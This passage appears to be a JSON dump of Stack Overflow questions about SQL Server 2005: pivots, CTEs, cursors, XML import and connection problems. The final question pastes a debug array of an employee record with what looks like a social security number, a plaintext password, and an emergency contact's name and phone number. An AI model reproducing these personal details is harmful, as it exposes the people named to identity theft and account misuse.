structure:</p>\n\n<pre><code>Election\nElectionId ElectionName\n1          12P\n2          11G\n\nHistory\nElectionId VoterId HowVoted\n1          1       Rep\n2          2       Dem\n1          2       Non \n\nVoter\nVoterId VoterName\n1       Bill Smith\n2       John Hearst\n</code></pre>\n\n<p>I want the output like this:<br/></p>\n\n<pre><code>VoterName   12P  11P  note: Election names change so need to be pivoted dynamically\nBill Smith  Rep  Null\nJohn Hearst Non  Dem    \n</code></pre>\n\n<p>I basically need to pivot the ElectionNames to the Column Names and then show how the voter voted in the row.    Suggestions?  Thanks!</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":22778,"score":6,"question_id":954016,"title":"Multiple Select Statements using SQL Server 2005 \"WITH\" Statement","body":"<p>I am trying to use the \"WITH\" statement in SQL Server 2005. It seems to work fine if I do something like:</p>\n\n<pre><code>WITH MyBigProducts AS (SELECT * FROM Products WHERE Size='Big')\nSELECT Name FROM MyBigProducts\n</code></pre>\n\n<p>But it fails if I try to use multiple select statements like:</p>\n\n<pre><code>WITH MyBigProducts AS (SELECT * FROM Products WHERE Size='Big')\nSELECT Name FROM MyBigProducts\nSELECT Count(*) FROM MyBigProducts\n</code></pre>\n\n<p>and the error message is \"Invalid object name 'MyBigProducts'\".</p>\n\n<p>Is there something I can do to increase the scope of the \"MyBigProducts\" table to include both of the select statements?</p>\n\n<p>My example is a simplification of my actual code causing the problem, so I'm not discounting the possibility that the above trivial example <em>should</em> work and that there is another bug in my SQL.</p>\n\n<p>I have tried wrapping a BEGIN and END around the two SELECT statements, but the parser could not compile it.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":84,"score":3,"question_id":11433498,"title":"Select records by comparing subsets","body":"<p>Given two tables (the rows in each table are distinct):</p>\n\n<pre><code> 1)  x | y     z   2)  x | y     z\n    -------   ---     -------   ---\n     1 | a     a       1 | a     a\n     1 | b     b       1 | b     b\n     2 | a             1 | c\n     2 | b             2 | a\n     2 | c             2 | b\n                       2 | c\n</code></pre>\n\n<p>Is there a way to select the values in the <code>x</code> column of the first table for which the subset of values in the <code>y</code> column, for that <code>x</code>, matches exactly the values in the <code>z</code> column of the second table? </p>\n\n<p>In case <code>1)</code>, expected result is <code>1</code>. If <code>c</code> is added to the second table then the expected result is <code>2</code>.<br>\nIn case <code>2)</code>, expected result is <code>no record</code> since neither of the subsets in the first table matches the subset in the second table. If <code>c</code> is added to the second table then the expected result is <code>1, 2</code>.</p>\n\n<p>I've tried using <code>except</code> and <code>intersect</code> to compare subsets of first table with the second table, which works fine, but it takes too long on the <code>intersect</code> part and I can't figure out why (the first table has about 10.000 records and the second has around 10).</p>\n\n<p>EDIT: I've updated the question to provide an extra scenario.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":213,"score":1,"question_id":11434935,"title":"Update multiple rows with WHERE clause","body":"<p>I am trying to update multiple rows at once (SQL Server 2005). Previously I was updating a single row with this query:</p>\n\n<pre><code>UPDATE dbo.My_Users \nSET MyUserId = @MyUserId\nWHERE EmailID = @EmailId\n</code></pre>\n\n<p>Now <code>@EmailId</code> will have comma-separated <code>EmailIds</code>. </p>\n\n<p>How can I modify the script to update multiple rows? I have seen some examples which make use of <code>UNION ALL</code>. But they are mostly to insert multiple records without where clause.</p>\n"},{"tags":["sql","sql-server-2005","ssis","lookup"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":229,"score":1,"question_id":11434242,"title":"How can I get the 'No Match Output' from a Lookup Transformation in SSIS 2005?","body":"<p>How can I get the 'No Match Output' from a Lookup Transformation in SSIS 2005?</p>\n\n<p>My past experience is in SSIS 2008, and I know that in 2008 this is an option on every Lookup transformation, but I have found that in SSIS 2005 this is not an option. Is there a reasonable work around to this, without having to use 'Ignore Failure' in Error handling.</p>\n\n<p>The package I am working with needs to incrementally update data within a table. Currently it wipes the table clean and repopulates the data each run. This doesn't work well with the application side of the coin, and the package needs to be altered to only update records that have changed or add new records into the table. My plan was to compare the ODS table to the DM  table using the lookup action, and I need the non-match output from the lookup to determine the changes.</p>\n\n<p>Thanks</p>\n\n<p>KJ </p>\n"},{"tags":["string","sql-server-2005","trim"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":962,"score":0,"question_id":8418869,"title":"Trim on a table column in SQL Server 2005","body":"<p>I have a table called <code>Examination</code> and a column <code>Name</code>. In this <code>Name</code> column lot of values are with leading spaces and trailing spaces. I want to know how to update this column so that there are no spaces in the values.</p>\n"},{"tags":["sql","visual-studio-2010","sql-server-2008","sql-server-2005","instance"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":11430562,"title":"where is my Sql Sevrer 2008 instance?","body":"<p>Folks</p>\n\n<p>I have Sql Sevrer 2005 and Sql Server 2008 R2 insatlled on my machine. </p>\n\n<p>whenver I start <code>SQL Server Management Studio</code> from Server 2008 R2 Menu. \nwhere <code>ServerName - .\\SqlExpress or mymachine\\SqlExpress</code></p>\n\n<p>and run <code>select @@version</code> - i always see <code>Microsoft SQL Server 2005 - 9.00.5057.00 (Intel X86)</code>   </p>\n\n<p>How can i access my <code>Sql Server 2008 instance?</code> Reading all the existing questions on SO </p>\n\n<p>Think I have messed up between <code>Default Instance and Named Instance</code>?</p>\n\n<p>could you please advice what can be done in this case. \nExcept to <code>reinstall Sql Sevrer 2008 or remove Sql Server 2005 instance</code></p>\n\n<p><img src=\"http://i.stack.imgur.com/VKKk2.png\" alt=\"enter image description here\"><img src=\"http://i.stack.imgur.com/J7flt.png\" alt=\"enter image description here\"></p>\n"},{"tags":["sql","excel","sql-server-2005","vba","for-loop"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":864,"score":3,"question_id":11420983,"title":"VBA (Excel) vs SQL - Comparing values in two rows (loop)","body":"<p>Is this possible in SQL?  It seems like a simple concept.  (I'm using SQL Server 2005)</p>\n\n<p>Loop through all the rows in my SQL table - (this is my vba excel script but bare with me)\ncompare the values in column m if one row =65 and the next equals 120 increase j, and print that value in another column (column q)</p>\n\n<pre><code>Sub InsertProductionCycle() \n\nDim LR As Long \nDim j As Integer \n\nj = 1 \nLR = Range(\"G\" &amp; Rows.Count).End(xlUp).Row \n\n    For i = 1 To LR Step 1 \n\n        Cells(i, \"Q\").Value = j \n\n        If Cells(i, \"M\").Value = 65 And Cells(i + 1, \"M\").Value = 190 Then \n            j = j + 1 \n        End If \n    Next i \n\nEnd Sub \n</code></pre>\n\n<p>Any thoughts from the SQL experts?  Can I do this in SQL? \nMy thoughts about this is: \n Perhaps the loop is a bit of a stretch, (I can run that in a sql job), but can you compare the rows and insert the j loop value in another column. Thats where I'm stuck.</p>\n\n<p>-Andrea</p>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005","null"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":292,"score":3,"question_id":11431651,"title":"SQL union between NULL and VARCHAR error","body":"<p>I have two views with identical columns. One of the columns on the first view is generated 'on the fly' and set as <code>NULL</code> and the same column on the other view has values stored as <code>varchar</code>. I have a stored proc that looks like this:</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[mi_GetLearners]  \n(@centrename nvarchar(200))  \nAS  \n\nSELECT [centrename]  \n      ,[Name]  \n      ,[Username] --generated on the fly as NULL\nFROM  [DB1].[dbo].[vw_Learners]  \nWHERE [centrename] = @centrename  \n\nUNION  \n\nSELECT [centrename]  \n      ,[Name]   \n      ,[Username] --values stored as varchar   \nFROM  [Linked_Server].[DB2].[dbo].[vw_Learners]  \nWHERE [centrename] = @centrename \n</code></pre>\n\n<p>DB1 is on SQL Server 2008 R2<br>\nDB2 is on SQL server 2005</p>\n\n<p>When I run the stored proc I get the following error:</p>\n\n<blockquote>\n  <p>Msg 245, Level 16, State 1, Line 1 Conversion failed when converting\n  the varchar value 'someusername' to data type int.</p>\n</blockquote>\n\n<p>Why is it trying to convert the value to int datatype as the other column is set as <code>NULL</code>? If I instead change the second column from <code>NULL</code> to <code>' '</code> the stored proc works fine... I'm really baffled as to why a union between a <code>varchar</code> column and <code>NULL</code> column generated in a select statement would throw such an error... any ideas?</p>\n\n<p>EDIT: I'm looking for an explanation rather than a solution... </p>\n\n<p>EDIT 2: Running the following code:</p>\n\n<pre><code>CREATE VIEW vw_myview\nAS\nSELECT NULL AS MyColumn\n\nEXECUTE sp_help vw_myview\n</code></pre>\n\n<p>Returns:</p>\n\n<pre><code>    Type    Column_name\n     int       MyColumn\n</code></pre>\n"},{"tags":["sql-server-2005","networking","jdbc","local"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":11429142,"title":"SQL server connection trouble in network but not in local","body":"<p>for the first time that I would work with SQL SERVER 2005, the jdbc connection doesn't work in the network I searched and have done thousand of things that doesn't work, i also want to precise that i already had worked with other DBMS, so here is the problem:\nwhen i try to connect by jdbc from the machine where sql server is installed everything work just fine, but when i try from a different machine, the jdbc is unable to create the connection, i already checked that TCP/IP communication is enabled that the port (not dynamically assigned) is 1433 and i even tried with different ports, i also tried with the same driver and different driver, i checked that i was able to communicate with the http server (who is installed in the machine where SQL server is installed) and it works  but that jdbc connection can't, i tried thousand of things until i forgot some of them, \nsomeone please help</p>\n"},{"tags":["sql","vb.net","sql-server-2008","sql-server-2005","replace"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":11428386,"title":"Is a REPLACE INTO query good practice?","body":"<p>I needed an SQL query that would update or create a database entry (if a certain customer doesn't exist yet). I found the current solution on the internet:</p>\n\n<pre><code>command.CommandText = \"REPLACE INTO [Resource_Tracer].[dbo].[Customer](CustomerName, CustomerID) VALUES (@CustomerName, @CustomerID)\"\n</code></pre>\n\n<p>Since I don't see it used a lot and actually never heard of it before, is this really the solution I want, or should I do this manually? </p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":92,"score":-4,"question_id":11426740,"title":"stuck at storing maths equation in database","body":"<p>I am developing MCQ generator desktop application in asp.net(c#), but I m stuck at storing maths equation in database (i.e. SQL Server 2005) and displaying it to UI, can any one help me out as soon as possible please. I want to save <a href=\"https://docs.google.com/open?id=0Byut71lsgtF_cnoxenNWaVJUUlk\" rel=\"nofollow\">this</a>  type of math expression.</p>\n"},{"tags":["sql","xml","sql-server-2005","import"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":123,"score":0,"question_id":11425175,"title":"Import XML into SQL Server 2005 data not imported","body":"<p>I have a table titled Code, with two fields, ID and Code. </p>\n\n<p>I have an XML file: </p>\n\n<pre><code> &lt;DataSet&gt;\n   &lt;scan&gt;\n     &lt;ID&gt;4&lt;/ID&gt;\n     &lt;Code&gt;420&lt;/Code&gt;\n   &lt;/scan&gt;\n   &lt;scan&gt;\n     &lt;ID&gt;5&lt;/ID&gt;\n     &lt;Code&gt;420&lt;/Code&gt;\n   &lt;/scan&gt;\n   &lt;scan&gt;\n     &lt;ID&gt;6&lt;/ID&gt;\n     &lt;Code&gt;420&lt;/Code&gt;\n   &lt;/scan&gt;\n   &lt;scan&gt;\n     &lt;ID&gt;4&lt;/ID&gt;\n     &lt;Code&gt;420&lt;/Code&gt;\n   &lt;/scan&gt;\n   &lt;scan&gt;\n     &lt;ID&gt;5&lt;/ID&gt;\n     &lt;Code&gt;420&lt;/Code&gt;\n   &lt;/scan&gt;\n  &lt;/DataSet&gt;\n</code></pre>\n\n<p>and am using this </p>\n\n<pre><code> INSERT INTO code (id,code) \n SELECT X.scan.query('id').value('.','INT'),\n   X.scan.query('code').value('.','VARCHAR(30)')\n FROM ( \n SELECT CAST(x AS XML)\n FROM OPENROWSET(\n      BULK 'C:\\dataimport.xml',\n      SINGLE_BLOB) AS T(x)\n       ) AS T(x)\n CROSS APPLY x.nodes('dataset/scan') AS X(scan);\n</code></pre>\n\n<p>The query runs without error, but no data is inserted into the Code table. \nI can't see what I'm missing. </p>\n\n<p>Thanks for your help. </p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":11417168,"title":"Sort records by time inserted","body":"<p>How can I query data in order it was created.</p>\n\n<p>I don't have a date-created field in this table.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":652,"score":3,"question_id":9910135,"title":"MS SQL 2008 - How do I convert xml value into a collection of rows from a ms sql table?","body":"<p>I have a value in my MS SQL table column called \"XDATA\" like this:</p>\n\n<pre><code>&lt;root&gt;&lt;KV&gt;&lt;Key&gt;1&lt;/Key&gt;&lt;Value&gt;A&lt;/Value&gt;&lt;/KV&gt;\n    &lt;KV&gt;&lt;Key&gt;2&lt;/Key&gt;&lt;Value&gt;B&lt;/Value&gt;&lt;/KV&gt;\n    &lt;KV&gt;&lt;Key&gt;3&lt;/Key&gt;&lt;Value&gt;C&lt;/Value&gt;&lt;/KV&gt;&lt;/root&gt;\n</code></pre>\n\n<p>I want to be able to get the value of the row back like this:</p>\n\n<pre><code>KEY, VALUE\n1,A\n2,B\n3,C\n</code></pre>\n\n<p>So far I have written this:</p>\n\n<pre><code>DECLARE @a1  xml\n    declare @x xml;\n    set @x = '&lt;root&gt;&lt;KV&gt;&lt;Key&gt;1&lt;/Key&gt;&lt;Value&gt;A&lt;/Value&gt;&lt;/KV&gt;\n        &lt;KV&gt;&lt;Key&gt;2&lt;/Key&gt;&lt;Value&gt;B&lt;/Value&gt;&lt;/KV&gt;\n        &lt;KV&gt;&lt;Key&gt;3&lt;/Key&gt;&lt;Value&gt;C&lt;/Value&gt;&lt;/KV&gt;&lt;/root&gt;';\n   SELECT @a1 = @x.query('(/root/KV/Key/text())')\n   select @a1\n</code></pre>\n\n<p>But I am getting 123 back.  Not three rows with two columns.  How do I get three rows back, each row with two columns:</p>\n\n<pre><code>KEY, VALUE\n    1,A\n    2,B\n    3,C\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["sql","mysql","asp.net-mvc","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":1055,"score":0,"question_id":2499603,"title":"mysql Command timeout error","body":"<p>I am converting my database from SQL Server 2005 to MySQL using asp .net mvc.</p>\n\n<p>I have bulk data in SQL Server (around 4 lakh [400,000] records), but I am facing command timeout/waiting for <code>CommandTimeout</code> error which, when I search on Google, can be given 65535 as its highest value or 0 (if it should wait for unlimited time).</p>\n\n<p>Both of these aren't working for me. I also have set any <code>ConnectTimeout</code> to 180. So should I have to change it too? Anybody who had faced this problem or have any confirmed knowledge please share.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures","cursors"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3069,"score":0,"question_id":170536,"title":"Reset @@FETCH_STATUS stored procedure","body":"<p>How can I reset the @@FETCH_STATUS variable or set it to 0 in a stored procedure?</p>\n\n<hr>\n\n<p>Another related question I have is can you bind FETCH_STATUS to a particular cursor?</p>\n"},{"tags":["database","sql-server-2005","tsql","cursor"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5289,"score":4,"question_id":1409965,"title":"T-SQL: A proper way to CLOSE/DEALLOCATE cursor in the update trigger","body":"<p>This is my first question on StackOverflow, so please be nice ;)</p>\n\n<p>Let's say I've got a trigger like this:</p>\n\n<pre><code>CREATE TRIGGER trigger1\n   ON [dbo].[table1] \n   AFTER UPDATE\nAS \nBEGIN   \t\t\t\n    --declare some vars\n    DECLARE @Col1 SMALLINT \n    DECLARE @Col1 TINYINT \n\n    --declare cursor\t\t\n    DECLARE Cursor1 CURSOR FOR \n    SELECT Col1, Col2 FROM INSERTED \t\t\t\n\n    --do the job\n    OPEN Cursor1\n    FETCH NEXT FROM Cursor1 INTO @Col1, @Col2\n\n    WHILE @@FETCH_STATUS = 0\n    BEGIN\n    \tIF ...something...\n    \tBEGIN\t\t\t\n    \t\tEXEC myProc1 @param1 = @Col1, @Param2 = @Col2\n    \tEND\t\t\t\t\n    \tELSE\n    \tIF ...something else...\n    \tBEGIN\t\t\t\n    \t\tEXEC myProc2 @param1 = @Col1, @Param2 = @Col2\n    \tEND\t\t\n\n    \tFETCH NEXT FROM Cursor1 INTO @Col1, @Col2\t\t\t\t\n    END\n\n    --clean it up\t\t\n    CLOSE Cursor1\n    DEALLOCATE Cursor1\t\t\t\t\t\nEND\n</code></pre>\n\n<p>I want to be sure that Cursor1 is always closed and deallocated. Even myProc1 or myProc2 fails.</p>\n\n<p>Shall I use try/catch block? </p>\n\n<p>Thanks,\nKamil</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":11420535,"title":"Issue using variable and TOP clause","body":"<p>I get the following error when trying to run the code below:</p>\n\n<blockquote>\n  <p>The number of rows in the TOP clause must be an integer.</p>\n</blockquote>\n\n<p>The @constCnt variable is declared as a SMALLINT and @thresh is declared as a DECIMAL(6,4).  When I execute <code>select (floor((@constCnt*(1+@thresh))))</code> I get an integer value returned with no decimals.  </p>\n\n<p>Any ideas how to get around this?  </p>\n\n<pre><code>    select top (@constCnt) * \n    into #temp\n    from (\n            select top (floor((@constCnt*(1+@thresh)))) pt.*,\n                inLast = CASE WHEN lh.code IS NULL THEN 0 ELSE 1 END\n            from #pretemp pt\n            left join #last lh\n            on lh.code = pt.code\n            order by em desc ) a    \n    order by inlast desc, emr desc, code\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":11419199,"title":"counting date and time for historical reporting","body":"<p>I am currently working on a query that will be used in junction with share-point to run reports.  I have a query that I know will work with Oracle, but the company I am working for is running SQL Server 2005. </p>\n\n<p>What the report will do is give the person the ability to select any date and time, and give the count for that specific operation. The problem is that there are large gaps in the time stamps (because it takes a little while for the product to get to the next operation).  The date type is varchar, so i used substrings to parse out the year, month, day, and time.  I have <a href=\"https://docs.google.com/spreadsheet/ccc?key=0AhNG3dN_hTHIdElnUnhMRkE3eFFYOGhRcC1QdzJtcHc\" rel=\"nofollow\">sample data</a> available.</p>\n\n<p>The people looking at the reports want the ability to say at this time and day how many units went through this operation. </p>\n\n<p>I know this is is confusing, let me know if you need any clarification.</p>\n\n<p>Here is the oracle syntax </p>\n\n<pre><code>SELECT T3.PAYMENT_DATE, T3.\"Hr\", T3.\"Min\", \n       (SELECT COUNT(*) \n        FROM INVOICE_ARCHIVE T4 \n        WHERE TO_NUMBER(TO_CHAR(T4.PAYMENT_DATE, 'MM')) &lt;= T3.\"Hr\" \n        AND TO_NUMBER(TO_CHAR(T4.PAYMENT_DATE, 'DD')) &lt;= T3.\"Min\") AS \"NUM\"\nFROM(SELECT T1.PAYMENT_DATE, T2.\"Hr\", T2.\"Min\"\n     FROM (SELECT (FLOOR((LEVEL + 359)/60)) AS \"Hr\", \n                  MOD((LEVEL + 359), 60) AS \"Min\"\n           FROM dual CONNECT BY LEVEL &lt;= 961) T2, INVOICE_ARCHIVE T1\n     ORDER BY T1.PAYMENT_DATE, T2.\"Hr\", T2.\"Min\") T3\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","greatest-n-per-group"],"answer_count":2,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":331,"score":7,"question_id":3998573,"title":"SQL Server - pull X random records per state","body":"<p>I have a table with records for each zip code in the united states. For the purposes of displaying on a map, I need to select X random records per state. How would I go about doing this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":322,"score":0,"question_id":8504165,"title":"How to get the Date Difference between two dates? ( Excluding weekends Saturday and Sunday, and out of office hours)","body":"<p>How to get the Date Difference between two dates? ( Excluding weekends Saturday and Sunday, and out of office hours). It should calculate the time only in weekdays and office hours.</p>\n\n<p>for example:</p>\n\n<p>Office timings : 8:00  to 18:00\nWeekend : Saturday and Sunday</p>\n\n<p>Example 1) Date diff of \"2011/12/14 17:22\" and 2011/12/15 10:00\" -- it is in YYYY/MM/DD HH:MM format.</p>\n\n<p>02 Hours 38 Mins ( It should exclude Out of Office hours)</p>\n\n<p>Example 2) DateDiff of \"2011/12/16 17:22\" and \"2011/12/19 10:00\"</p>\n\n<p>02 Hours 38 Mins ( it should exclude Saturday and Sunday).</p>\n\n<p>Please help me... Thanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":137,"score":2,"question_id":11403847,"title":"Return all groups that have exactly the same employees","body":"<p>There are 2 tables:</p>\n\n<pre><code>Employee\n(id_employee, worker_name)\n\nGroups\n(id_employee, group_name)\n</code></pre>\n\n<p>Here is creation script for you:</p>\n\n<pre><code>CREATE TABLE Employee (\n   id_employee int identity(1,1) NOT NULL CONSTRAINT PK_Employee PRIMARY KEY CLUSTERED,\n   worker_name nvarchar(100) CONSTRAINT UQ_Employee_worker_name UNIQUE\n);\n\nCREATE TABLE Groups (\n   id_employee int NOT NULL CONSTRAINT FK_Groups_id_employee FOREIGN KEY REFERENCES Employee (id_employee),\n   group_name varchar(10) NOT NULL,\n   CONSTRAINT PK_Groups PRIMARY KEY CLUSTERED (group_name, id_employee)\n);\n\nINSERT Employee\nSELECT 'worker 1'\nUNION ALL SELECT 'worker 2'\nUNION ALL SELECT 'worker 3'\nUNION ALL SELECT 'worker 4';\n\nINSERT Groups\nSELECT 1, 'a1'\nUNION ALL SELECT 2, 'a1'\nUNION ALL SELECT 3, 'a2'\nUNION ALL SELECT 4, 'a2'\nUNION ALL SELECT 1, 'b1'\nUNION ALL SELECT 2, 'b1'\nUNION ALL SELECT 3, 'b2'\nUNION ALL SELECT 4, 'b2'\nUNION ALL SELECT 2, 'b3'\nUNION ALL SELECT 3, 'b3'\nUNION ALL SELECT 4, 'b3';\n</code></pre>\n\n<p>I need a query that for a given <code>id_group</code> will return all other groups that have exactly the same employees.</p>\n\n<p>For example:</p>\n\n<pre><code>SELECT for 'a1'\n</code></pre>\n\n<p>-> Should return 'b1' because in both groups there are: worker 1 &amp; worker 2</p>\n\n<pre><code>SELECT for 'a2'\n</code></pre>\n\n<p>-> Should return 'b2' because in both groups there are: worker 3 &amp; worker 4</p>\n\n<p>Note that groups need to be exactly the same, all members of <code>a1</code> need to be in <code>b1</code> and size of both groups need to be the same as well.</p>\n"},{"tags":["sql-server","database","sql-server-2005","diff"],"answer_count":23,"favorite_count":20,"up_vote_count":22,"down_vote_count":2,"view_count":11879,"score":20,"question_id":104203,"title":"Anyone know of any good Database Diff tools?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10688/best-tool-for-auto-generating-sql-change-scripts-for-sql-server\">Best tool for auto-generating SQL change scripts for SQL Server</a>  </p>\n</blockquote>\n\n\n\n<p>Has anyone has any success with open source (or retail) database diff tool for <code>SQL Server 2005</code>?, as I can't find any good ones in Sourceforge.</p>\n"},{"tags":["sql","sql-server-2005","max"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":11404664,"title":"SQL Update most recent in table instead of most recent on selected record","body":"<p>I need to update members records that haven't attended in the past 14 days. \nThere are two tables: Members and Attendance. I need to update the member record with the most recent \"Last_Attend_Date\" if the Attend_Freq is less than 5 over the last 14 days. </p>\n\n<pre><code> Members table:\n ID     Attend_Freq     Last_Attend_Date\n123        4              2012-7-5  -- This is the result of the query, the most \n                                       recent date in the table instead of the \n                                       most recent for the member\n\n Attendance\n ID     Member_ID       Last_Attend_Date\n 987      123               2012-6-5\n 888      123               2012-6-4\n 567      123               2012-6-3\n 456      234               2012-6-30\n1909      292               2012-7-5\n</code></pre>\n\n<p>This is the query but its giving me the most recent Last_Attend_Date in the Attendance table instead of the most recent from the member that I need to update. </p>\n\n<pre><code> UPDATE M\n SET Last_Attend_Date = \n (SELECT Max(Last_Attend_Date) FROM Attendance A \n JOIN Members M ON A.Member_ID = M.ID \n WHERE A.Member_ID =M.id )\n FROM Members M\n JOIN Attendance A on A.Member_ID = M.id\n WHERE Attend_Freq &lt;'5' and Last_Attend_Date &lt;getdate()-14 and A.Member_ID = M.ID\n</code></pre>\n"},{"tags":["sql-server-2005","active-directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":11409053,"title":"Accessing Active Directory from SQL Server","body":"<p>I want to access Active Directory and to be able to execute LDAP queries via stored procedure in SQL Server.</p>\n\n<p>How do I declare a linked server for that?</p>\n\n<p>How do I declare LDAP queries?</p>\n\n<p>Thanks in advance</p>\n\n<p>Kobi</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":386,"score":0,"question_id":898624,"title":"How to Display data in a linear fashion","body":"<p>Using this example found <a href=\"http://www.experts-exchange.com/Microsoft/Development/MS-SQL-Server/SQL-Server-2005/Q%5F22938684.html\" rel=\"nofollow\">here</a> </p>\n\n<blockquote>\n  <p>I have a report i want to create which\n  will show me infomation like the\n  following:</p>\n  \n  <p>Account ID , DateEntered, DateFirst\n  contact was made, Dealt by, Date 2nd\n  contact was made, Dealt by....</p>\n  \n  <p>However all this information is heald\n  in one table but the info comes like\n  this  (See example in link)</p>\n  \n  <p>Now i would like to see the data like\n  this in a linear fashion:</p>\n  \n  <p>123       12-04-07      John 14-04-07      Mary          15-06-07 Cait  </p>\n  \n  <p>However differnt accounts will have\n  different amounts of data in it so\n  some may have 5 rows othere could have\n  ten?</p>\n</blockquote>\n\n<p>I would like to display data in a linear fashion so that each row is unique. In the case of the example, the unique identifier would be the accountID. My personal scenario is a bit different in that I have the data in several tables but can easily join them to get a similar output to the above example. Where I am having trouble is making the data linear so that each row is unique and does not repeat for each different variance.</p>\n\n<p>Can this be done? </p>\n"},{"tags":["php","sql-server","sql-server-2005","cakephp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":11406952,"title":"Problems with Cakephp 1.3 and mssql?","body":"<p>Here is the problem. The thing we are trying to accomplish is simple and works when developing in a MySQL environment. But upon pushing to an MSSQL staging environment we are getting this weird issue. Our relationships in the models are set to every standard we have ever had to deal with but for some reason we are getting this result:</p>\n\n<pre><code>Array\n(\n[0] =&gt; Array\n    (\n        [0] =&gt; Array\n            (\n                [PerformanceDevelopmentComment_] =&gt; 2012-07-09 18:22:46\n            )\n\n        [PerformanceDevelopmentObject] =&gt; Array\n            (\n                [id] =&gt; 4\n                [employee_id] =&gt; 376\n                [competency_id] =&gt; 1\n                [year] =&gt; 2012\n                [created] =&gt; 2012-06-22 16:36:36\n                [modified] =&gt; 2012-06-22 16:36:36\n            )\n\n        [Employee] =&gt; Array\n            (\n                [id] =&gt; 376\n                [user_id] =&gt; 3\n                [ssn] =&gt; 288-72-5150\n                [ad_account] =&gt; 1\n                [contact_id] =&gt; 372\n                [username] =&gt; jhazelbaker\n                [audix_number] =&gt; 6158\n                [position_id] =&gt; 399\n                [location_id] =&gt; 14\n                [employee_category_id] =&gt; 4\n                [citizenship_id] =&gt; 1\n                [veteran_status_id] =&gt; 3\n                [education_level_id] =&gt; 6\n                [years_prior_experience] =&gt; 0\n                [spouse_first_name] =&gt; \n                [spouse_last_name] =&gt; \n                [emergency_contact_name] =&gt; Nate Cox\n                [emergency_contact_relationship_id] =&gt; 7\n                [emergency_contact_comment] =&gt; 502-320-6005\n                [supervisor_id] =&gt; 38\n                [status] =&gt; A\n                [desired_turnover] =&gt; 0\n                [welcome_on_premise] =&gt; 1\n                [rehire_status] =&gt; 0\n                [shirt_size] =&gt; S\n                [score] =&gt; -3\n                [years_to_control_point] =&gt; 2\n                [compensation_status_id] =&gt; 8\n                [range_placement_percent] =&gt; 25\n                [fiscal_year] =&gt; \n                [comp_change] =&gt; 0\n                [effective_date] =&gt; Jul  1 2007 12:00:00:000AM\n                [score_compare] =&gt; -3\n                [supervisor_rating_id] =&gt; \n                [hire_date] =&gt; Oct 16 2003 12:00:00:000AM\n                [termination_date] =&gt; \n                [exit_interview_date] =&gt; \n                [vacation_request_hours] =&gt; 40\n                [vacation_request_hours_annual] =&gt; 40\n                [created] =&gt; \n                [modified] =&gt; 2012-01-12 11:00:22\n                [passwd] =&gt; stern\n                [nucleus] =&gt; 1\n                [irreplaceable] =&gt; 1\n                [termination_reason_id] =&gt; \n                [forward_email_to_employee_id] =&gt; \n            )\n\n        [Competency] =&gt; Array\n            (\n                [id] =&gt; 1\n                [title] =&gt; Integrity and Trust\n                [overdoing] =&gt; May be too direct at times, which may catch people off guard and make them uncomfortable; may push openness and honesty to the point of being disruptive; may be so \"only the facts\" driven as to omit drawing reasonable conclusions, rendering opinions, or fixing blame, even when it's reasonable\n                [normal] =&gt; Is widely trusted; is seen as a direct, truthful individual; can present the unvarnished truth in an appropriate and helpful manner; keeps confidences; admits mistakes; doesn't blame others for his/her own mistakes or misrepresent him/herself for personal gain or protection.\n                [underdoing] =&gt; Fails to follow through on promises; leaves people waiting for delivery; says one thing and means does another; is inconsistent and unpredictable at times; moves on without completing the task.\n                [causes] 